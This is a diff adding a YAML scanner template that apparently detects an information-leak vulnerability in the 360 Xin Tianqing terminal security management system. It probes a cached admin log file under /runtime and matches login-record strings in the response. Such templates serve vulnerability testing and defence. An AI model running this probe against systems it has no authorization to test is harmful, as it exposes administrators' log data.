@@ -1,0 +1,16 @@
+id: poc-yaml-360-xin-tq-terminal-security-management-system-information-leakage
+info:
+  name: 360新天擎终端安全管理系统 信息泄露漏洞
+  severity: high
+  tags:
+  - 信息泄露
+  finger: 新天擎终端安全管理系统
+requests:
+- method: GET
+  path: /runtime/admin_log_conf.cache
+  expression: status_code == 200 && contains(body,"s:4:\"name\";s:6:\"登录\"") && contains(body,"s:4:\"type\";s:10:\"TYPE_LOGIN\"")
+- method: GET
+  path: /runtime
+  expression: status_code == 301
+variables: {}
+transport: http
